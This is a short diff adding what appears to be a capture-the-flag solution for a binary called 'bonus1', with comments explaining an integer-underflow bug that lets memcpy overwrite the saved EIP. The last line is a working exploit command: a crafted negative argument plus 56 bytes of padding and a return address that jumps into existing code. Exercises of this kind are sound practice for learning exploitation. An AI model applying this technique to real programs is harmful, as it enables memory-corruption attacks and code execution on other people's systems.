@@ -1,0 +1,7 @@
+# Underflow exploit
+# We saw the first arg must be < 9
+# We tried with negative values, memcpy segv
+# We put negative value and argv[2], it smsh the eip address
+# The first arg must not be too big
+# We cannot put shellcode so we tried to jump to a another code section
+./bonus1 -1073741808 $(python -c 'print "A"*56 + "\x82\x84\x04\x08"')
